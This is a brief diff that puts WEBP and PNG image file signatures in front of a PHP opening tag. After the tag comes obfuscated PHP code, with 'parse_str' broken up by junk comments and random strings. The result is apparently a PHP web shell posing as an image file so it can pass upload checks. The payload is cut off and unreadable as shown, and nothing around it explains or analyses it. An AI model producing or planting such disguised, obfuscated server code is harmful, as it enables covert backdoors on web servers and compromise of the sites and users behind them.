@@ -1,4 +1,5 @@
-<?php
+RIFF¦  WEBPVP8X
+‰PNG<?php
 #MN*V!)dE_D2i|f*f
 	 //\at":;%GV"#\JW<[*`@*\6,^O
 parse_str#N!,{A)#T_s"pA=4'!zL(	/*#}xMC0Y4nbfN2^?Ne5eJH-{{@'3HP$*/"0"//uH2Ipl82HCs,g6T)GftZMjiv?N6`L(v>S9.//S|c{9N"A@UWc7A7.n223L}y~:$8s
